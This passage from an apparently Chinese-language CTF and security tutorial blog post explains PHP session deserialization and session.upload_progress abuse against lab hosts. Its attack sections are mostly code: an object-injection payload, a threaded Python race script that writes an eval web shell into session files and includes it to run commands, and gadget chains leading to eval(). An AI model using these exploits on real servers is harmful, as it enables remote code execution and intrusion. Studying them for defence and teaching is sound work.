<span class="hljs-keyword">echo</span> CURL(<span class="hljs-string">&#x27;http://127.0.0.1/lemon/shell.php?drom=readfile(\&#x27;/flag\&#x27;);&#x27;</span>);</code></pre></div>





<h2 id="0x05-php-session反序列化"><a href="#0x05-php-session反序列化" class="headerlink" title="0x05 php session反序列化"></a>0x05 php session反序列化</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>首先我们需要了解session反序列化是什么？<br>PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化<br>在php.ini中有以下配置项，wamp的默认配置如图</p>
<p><a target="_blank" rel="noopener" href="https://github.com/twosmi1e/twosmi1e.github.io/blob/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545234989274.png?raw=true"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1545234989274.png" alt="img"></a><br><a target="_blank" rel="noopener" href="https://github.com/twosmi1e/twosmi1e.github.io/blob/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545235002297.png?raw=true"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1545235002297.png" alt="img"></a></p>
<p><code>session.save_path</code> 设置session的存储路径<br><code>session.save_handler</code> 设定用户自定义存储函数<br><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话<br><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php<br>除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同</p>
<ul>
<li>php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</li>
<li>php 键名＋竖线＋经过serialize()函数反序列处理的值</li>
<li>php_serialize serialize()函数反序列处理数组方式</li>
</ul>
<h3 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h3><p>php中的session内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为session序列化后的值。<br>来测试一个demo</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);
    session_start();

    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;twosmi1e&#x27;</span>;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>运行后在配置文件设定的路径中会生成一个session文件</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1545236350464.png" alt="img"></p>
<p>存储引擎为php时</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1545236700999.png" alt="img"></p>
<p>存储引擎为php_binary时结果为</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1545236642027.png" alt="img"></p>
<p>三种处理器的存储格式差异，就会造成在session序列化和反序列化处理器设置不当时的安全隐患。</p>
<p>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ryat&#x27;</span>] = <span class="hljs-string">&#x27;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&#x27;</span>;</code></pre></div>

<p>上述的$_SESSION的数据使用php_serialize，那么最后的存储的内容就是<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&quot;;&#125;</code></p>
<p>但是我们在进行读取的时候，选择的是php，那么最后读取的内容是:</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">array</span> (size=<span class="hljs-number">1</span>)
 <span class="hljs-string">&#x27;a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;&#x27;</span> =&gt; 
 <span class="hljs-keyword">object</span>(<span class="hljs-built_in">__PHP_Incomplete_Class</span>)[<span class="hljs-number">1</span>]
 <span class="hljs-keyword">public</span> <span class="hljs-string">&#x27;__PHP_Incomplete_Class_Name&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;PeopleClass&#x27;</span> (length=<span class="hljs-number">11</span>)</code></pre></div>

<p>这是因为当使用php引擎的时候，php引擎会以|作为作为key和value的分隔符，那么就会将<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:&#123;&#125;</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。</p>
<h3 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h3><h4 id="代码中可控session"><a href="#代码中可控session" class="headerlink" title="代码中可控session"></a>代码中可控session</h4><p>存在s1.php和us2.php，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞、<br>s1.php，使用php_serialize来处理session</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);
session_start();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;spoock&quot;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];</code></pre></div>

<p><strong>us2.php,使用php来处理session</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs php">ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);
session_start();
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lemon</span> </span>&#123;
 <span class="hljs-keyword">var</span> <span class="hljs-variable">$hi</span>;
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
 <span class="hljs-keyword">$this</span>-&gt;hi = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;
 &#125;
 
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
  <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;hi);
 &#125;
&#125;</code></pre></div>

<p><strong>当访问s1.php时，提交如下的数据：</strong></p>
<p>localhost/s1.php?a=|O:5:”lemon”:1:{s:2:”hi”;s:14:”echo “spoock”;”;}</p>
<p>此时传入的数据会按照php_serialize来进行序列化。</p>
<p>此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的<code>eval()</code>方法。</p>
<h4 id="代码中不可控"><a href="#代码中不可控" class="headerlink" title="代码中不可控"></a>代码中不可控</h4><p>当代码中不可控session时，可以利用session.upload_progress进行文件包含和反序列化</p>
<p>在php.ini有以下几个默认选项</p>
<ol>
<li>session.upload_progress.enabled = on</li>
<li>session.upload_progress.cleanup = on</li>
<li>session.upload_progress.prefix = “upload_progress_”</li>
<li>session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS”</li>
<li>session.use_strict_mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要。</li>
</ol>
<ul>
<li><p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
</li>
<li><p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
</li>
<li><p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
</li>
<li><p><code>prefix+name</code>将表示为session中的键名</p>
</li>
</ul>
<h5 id="利用session-upload-progress进行文件包含利用"><a href="#利用session-upload-progress进行文件包含利用" class="headerlink" title="利用session.upload_progress进行文件包含利用"></a>利用session.upload_progress进行文件包含利用</h5><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$b</span>&quot;</span>;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>
<p><strong>问题一</strong></p>
<p>代码里没有<code>session_start()</code>,如何创建session文件呢。</p>
<p><strong>解答一</strong></p>
<p>其实，如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
<p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
<p><strong>问题二</strong></p>
<p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>
<p><strong>解答二</strong></p>
<p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>
<p><strong>payload</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">import</span> io
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> threading
sessid = <span class="hljs-string">&#x27;TGAO&#x27;</span>
data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">session</span>):</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)
        resp = session.post( <span class="hljs-string">&#x27;http://127.0.0.1/ss/index.php&#x27;</span>, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">session</span>):</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        resp = session.post(<span class="hljs-string">&#x27;http://127.0.0.1/ss/index.php?file=/var/lib/php/sessions/sess_&#x27;</span>+sessid,data=data)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;tgao.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:
            print(resp.text)
            event.clear()
        <span class="hljs-keyword">else</span>:
            print(<span class="hljs-string">&quot;[+++++++++++++]retry&quot;</span>)

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:
    event=threading.Event()
    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):
            threading.Thread(target=write,args=(session,)).start()

        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):
            threading.Thread(target=read,args=(session,)).start()
    event.<span class="hljs-built_in">set</span>()</code></pre></div>





<h5 id="利用session-upload-progress进行反序列化攻击"><a href="#利用session-upload-progress进行反序列化攻击" class="headerlink" title="利用session.upload_progress进行反序列化攻击"></a>利用session.upload_progress进行反序列化攻击</h5><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote>
<p>php7.2</p>
<p>ubuntu18.04</p>
<p><code>session.serialize_handler=php_serialize</code>，其余session相关配置为默认值  //session.upload_progress依赖php.ini</p>
</blockquote>
<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);
ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);
session_start();
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Door</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;handle=<span class="hljs-keyword">new</span> TimeNow();
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;handle-&gt;action();
    &#125;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TimeNow</span> </span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你的访问时间:&quot;</span>.<span class="hljs-string">&quot;  &quot;</span>.date(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>,time());
    &#125;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span>  <span class="hljs-title">IP</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ip</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;ip = <span class="hljs-string">&#x27;echo $_SERVER[&quot;REMOTE_ADDR&quot;];&#x27;</span>;
    &#125;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;ip);
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<p><strong>问题一</strong></p>
<p>整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢</p>
<p><strong>解答一</strong></p>
<p>这里，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。</p>
<p>另外，与文件包含利用一样，也需要进行竞争。</p>
<p>首先利用exp.php脚本构造恶意序列化语句</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);
session_start();
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Door</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> IP();
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;handle-&gt;action();
    &#125;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TimeNow</span> </span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你的访问时间:&quot;</span>.<span class="hljs-string">&quot;  &quot;</span>.date(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>,time());
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span>  <span class="hljs-title">IP</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ip</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-comment">//$this-&gt;ip=&#x27;payload&#x27;;</span>
        <span class="hljs-keyword">$this</span>-&gt;ip=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;
        <span class="hljs-comment">//$this-&gt;ip=&#x27;print_r(scandir(&#x27;/&#x27;));&#x27;;</span>
    &#125;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;ip);
    &#125;
&#125;
<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Door();
<span class="hljs-variable">$b</span>=serialize(<span class="hljs-variable">$a</span>);
<span class="hljs-variable">$c</span>=addslashes(<span class="hljs-variable">$b</span>);
<span class="hljs-variable">$d</span>=str_replace(<span class="hljs-string">&quot;O:4:&quot;</span>,<span class="hljs-string">&quot;|O:4:&quot;</span>,<span class="hljs-variable">$c</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>其此利用exp.py脚本进行竞争</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> io
<span class="hljs-keyword">import</span> sys

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">ip,port</span>):</span>
    
    f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> *<span class="hljs-number">1024</span>*<span class="hljs-number">1</span>)
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        et.wait()
        url = <span class="hljs-string">&#x27;http://&#x27;</span>+ip+<span class="hljs-string">&#x27;:&#x27;</span>+<span class="hljs-built_in">str</span>(port)+<span class="hljs-string">&#x27;/test5.php&#x27;</span>
        headers = &#123;
        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,
        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,
        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,
        <span class="hljs-string">&#x27;DNT&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,
        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;PHPSESSID=20190506&#x27;</span>,
        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,
        <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>
        &#125;
        proxy = &#123;
        <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1:8080&#x27;</span>
        &#125;
        data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span>&#125;
        files=&#123;
            <span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">r&#x27;|O:4:\&quot;Door\&quot;:1:&#123;s:6:\&quot;handle\&quot;;O:2:\&quot;IP\&quot;:1:&#123;s:2:\&quot;ip\&quot;;s:10:\&quot;phpinfo();\&quot;;&#125;&#125;&#x27;</span>,f,<span class="hljs-string">&#x27;text/plain&#x27;</span>)
        &#125;
        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) <span class="hljs-comment">#,proxies=proxy</span>
        resp.encoding=<span class="hljs-string">&quot;utf-8&quot;</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(resp.text)&lt;<span class="hljs-number">2000</span>:
            print(<span class="hljs-string">&#x27;[+++++]retry&#x27;</span>)
        <span class="hljs-keyword">else</span>:
            print(resp.content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
            et.clear()
            print(<span class="hljs-string">&#x27;success!&#x27;</span>)
            

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    ip=sys.argv[<span class="hljs-number">1</span>]
    port=<span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])
    et=threading.Event()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):
        threading.Thread(target=exp,args=(ip,port)).start()
    et.<span class="hljs-built_in">set</span>()
</code></pre></div>

<p>本地实测没有成功，session写入有问题。</p>
<h3 id="例子1：写入session文件后反序列化"><a href="#例子1：写入session文件后反序列化" class="headerlink" title="例子1：写入session文件后反序列化"></a>例子1：写入session文件后反序列化</h3><h4 id="安恒杯"><a href="#安恒杯" class="headerlink" title="安恒杯"></a>安恒杯</h4><p><strong>class.php</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

highlight_string(file_get_contents(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])));
<span class="hljs-comment">//show_source(__FILE__);</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo1</span></span>&#123;
 <span class="hljs-keyword">public</span> <span class="hljs-variable">$varr</span>;
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
  <span class="hljs-keyword">$this</span>-&gt;varr = <span class="hljs-string">&quot;index.php&quot;</span>;
 &#125;
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
  <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-keyword">$this</span>-&gt;varr))&#123;
   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;文件&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;varr.<span class="hljs-string">&quot;存在&lt;br&gt;&quot;</span>;
  &#125;
  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;</span>;
 &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo2</span></span>&#123;
 <span class="hljs-keyword">public</span> <span class="hljs-variable">$varr</span>;
 <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
  <span class="hljs-keyword">$this</span>-&gt;varr = <span class="hljs-string">&#x27;1234567890&#x27;</span>;
  <span class="hljs-keyword">$this</span>-&gt;obj = <span class="hljs-literal">null</span>;
 &#125;
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;
  <span class="hljs-keyword">$this</span>-&gt;obj-&gt;execute();
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;varr;
 &#125;
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__desctuct</span>(<span class="hljs-params"></span>)</span>&#123;
  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;</span>;
 &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo3</span></span>&#123;
 <span class="hljs-keyword">public</span> <span class="hljs-variable">$varr</span>;
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>)</span>&#123;
  <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;varr);
 &#125;
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__desctuct</span>(<span class="hljs-params"></span>)</span>&#123;
  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;</span>;
 &#125;
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>



<p><strong>index.php</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);

<span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;./class.php&quot;</span>);

session_start();

<span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> foo1();

<span class="hljs-variable">$obj</span>-&gt;varr = <span class="hljs-string">&quot;phpinfo.php&quot;</span>;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>先构造链子</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//require_once &quot;class.php&quot;;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo1</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$varr</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$varr</span></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;varr = <span class="hljs-variable">$varr</span>;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo2</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$varr</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;varr = <span class="hljs-string">&#x27;&#x27;</span>;
        <span class="hljs-keyword">$this</span>-&gt;obj = <span class="hljs-variable">$obj</span>;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo3</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$varr</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$varr</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;varr = <span class="hljs-variable">$varr</span>;
    &#125;
&#125;

<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> foo1(<span class="hljs-keyword">new</span> foo2(<span class="hljs-keyword">new</span> foo3(<span class="hljs-string">&quot;phpinfo();&quot;</span>)));
<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>),<span class="hljs-string">&quot;\n&quot;</span>;
<span class="hljs-comment">//O:4:&quot;foo1&quot;:1:&#123;s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:&#123;s:4:&quot;varr&quot;;s:0:&quot;&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:&#123;s:4:&quot;varr&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;</span></code></pre></div>

<p>写入的方式主要是利用PHP中<a target="_blank" rel="noopener" href="http://php.net/manual/en/session.upload-progress.php">Session Upload Progress</a>来进行设置，具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中，上传的页面的写法如下：</p>
<div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span>
